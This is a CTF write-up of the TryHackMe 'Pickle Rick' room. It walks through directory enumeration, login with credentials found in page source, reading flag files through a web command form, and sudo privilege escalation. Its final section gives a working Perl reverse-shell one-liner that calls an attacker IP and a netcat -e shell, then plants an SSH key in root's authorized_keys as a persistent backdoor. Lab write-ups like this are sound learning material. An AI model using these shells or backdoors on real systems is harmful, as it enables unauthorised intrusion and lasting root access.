---
description: LAST UPDATED 23-MAY-2025
---

# Pickle Rick

{% embed url="https://tryhackme.com/room/picklerick" %}

## Manual Inspection

When I visited the webpage I was greeted with  a note that relates to the theme of the CTF. However, there seem to be nothing interesting or relevant to the technical details of the machine.

Next, I used the Chrome developer tools to inspect the source code, and I found the following comment:

`Note to self, rememberusername!`&#x20;

`Username: R1ckRul3s`

This tells me that there exists a username `R1ckRul3s`.



## Directory Enumeration

The wordlists used in this section are present in the root directory: `/usr/share/wordlists/SecLists/Discovery/Web-Content`&#x20;

{% embed url="https://github.com/danielmiessler/SecLists" %}

_**(1) Basic discovery**_

1. _**common.txt**_

```bash
gobuster dir -u ... -w .../common.txt
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

From the results, it appears that the `/robots.txt` path exists. Upon visiting, it returns:

`Wubbalubbadubdub`&#x20;

Seems like a strange text, could it be another username, a clue, or perhaps a password? We will leave it here for now.



_**(2) Fingerprinting the web server**_

```bash
$ curl -I http://<target_url>
...
```

```bash
$ nc http://<target_url> 80
```

```bash
$ whatweb <target_url>
```

We have found out that the web server uses _**Apache.**_



_**(3) Enumerating PHP**_

PHP is commonly used as the underlying programming language on an Apache web server. Thus, I decided to enumerate common PHP filenames and directories. Note that the commands listed below are similar to the ones used in the first part above, just with addition of flags, and change of wordlist.

1. _common.txt_

* Extra `-x php` option

```bash
$ gobuster dir -u http://<target> -x php -w .../common.txt
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



2. _Common-PHP-Filenames.txt_

```bash
$ gobuster dir -u http://<target> -w .../Common-PHP-Filenames.txt
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It appears that we have found a few `.php` files such as `login.php`, `portal.php` and `denied.php`.&#x20;

_**The****&#x20;****`ffuf`****&#x20;****tool can be used to enumerate the directories too:**_

```bash
# 1)
$ ffuf -u http://<target>/FUZZ.php -w .../common.txt

# 2)
$ ffuf -u http://<target>/FUZZ -w .../Common-PHP-Filenames.txt
```

***

Next, I visited the path `/login.php` , and was presented with a login page. I utilized the information we have gathered earlier to discover the username and password combination of `R1ckRul3s` and `Wubbalubbadubdub` respectively.

**Enumerating the webpage**

&#x20;After logging in, the webpage was redirected to`/portal.php` .

The following comment was found in the source code:

`Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`

This is a string that has been base64-encoded multiple times. The plaintext value turns out to be `rabbit hole` . Well, is this a clue,  perhaps a directory path value, name of a file, or simply something just to throw us off?

The main interface presented an input form that accepts commands for a Linux environment. This form will be used to enumerate the Linux system and find the ingredients.



## First Ingredient

```bash
$ cat Sup3rS3cretPickl3Ingred.txt # does not work
$ more Sup3rS3cretPickl3Ingred.txt # does not work
$ less Sup3rS3cretPickl3Ingred.txt # WORKS!
mr. meeseek hair
```



## Second Ingredient

```bash
$ ls /home
rick ubuntu

$ ls /home/rick
second ingredients

$ less '/home/rick/second ingredients' # 'more' and 'cat' disabled
1 jerry tear
```



## Third Ingredient

I was having difficulty finding the third ingredient from the file system, as most of my attempts at enumerating the directories returned an empty response. Thus, I decided to further enumerate the webpage.

Upon visiting `/denied.php` ,

We are presented with a message: "_Only the REAL rick can view this page._" This made me wonder, by _REAL rick_, does this mean we have to somehow access this page via the root account?

### Privilege Escalation&#x20;

**(1) SQL Injection attempt**

I attempted a SQL injection attack on the login form, in hopes of potentially discovering the name and password combination of the root, or higher privilege account.

```bash
$ sqlmap -u http://<target>:[port] --data "username=random&password=random&sub=Login" --risk ... -- ... --batch
... no signifcant results
```

The database used in the system seems to either not use an SQL-based database, or is simply not vulnerable to a SQL injection attack.

As mentioned before, access to the third ingredient most likely requires a privileged account. Thus, I attempted to escalate my privileges.

**(2) Linux privilege escalation enumeration**

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data) # no dangerous groups such as adm

$ sudo -l

Matching Defaults entries for www-data on ip-10-10-49-150:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-49-150:
    (ALL) NOPASSWD: ALL 
    
```

The output  `(ALL) NOPASSWD: ALL`  tells us that the current user is allowed to run `sudo` without any password. This means that we are able to gain an unauthenticated superuser privilege.



**Finding the last and final ingredient**

After further enumeration on the file system, I found out that the 3rd ingredient is in the `/root` directory.&#x20;

```bash
$ sudo ls -la /root
...
3rd.txt
...

$ sudo less /root/3rd.txt
fleeb juice
```

### Additional pointers

**(1) Attempts to initiate a reverse shell (for a stable shell experience)**

**Attacker machine**

```bash
$ nc -lvnp [port]
```

_**1.1 Netcat (does not work)**_

* The attacker machine does not receive any connections

```bash
$ nc <attacker> [port] -e /bin/sh 
```

_**1.2 Perl (works)**_

* The attacker machine receives a shell environment

```bash
$ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**(2) Persistence**&#x20;

Now that we have a session with superuser privileges (`sudo`), we can load our SSH public key to the `.ssh/authorized_keys` file. Specifically, the key will be added to the file under the home directory for the root user: `/root`, allowing us to gain persistence as the root user.

{% embed url="https://jarrettgxz-sec.gitbook.io/networking-concepts/ssh/ssh-public-key-authentication" %}

_**From the attacker machine**_

_**2.1 Generate a SSH keypair**_&#x20;

```bash
$ ssh-keygen -f ssh-user-key

# view the PUBLIC key generated
$ cat ssh-user-key.pub
ssh-rsa AAAA... user@host
```

_**2.2 Load the public key (reverse shell connection)**_

```bash
$ echo "ssh-rsa AAAA... user@host" | sudo tee -a /root/.ssh/authorized_keys > /dev/null
```

***

Now, we can SSH into the server as the `root` user by providing our private key:

```bash
$ ssh -i ssh-user-key root@host

root@host:~#
```

Assuming that the admin does not clean up the `.ssh/authorized_keys` file, we can access our backdoor with a root shell anytime as needed.

> NOTE: Yes, ofcourse I removed the backdoor access after I was done testing.

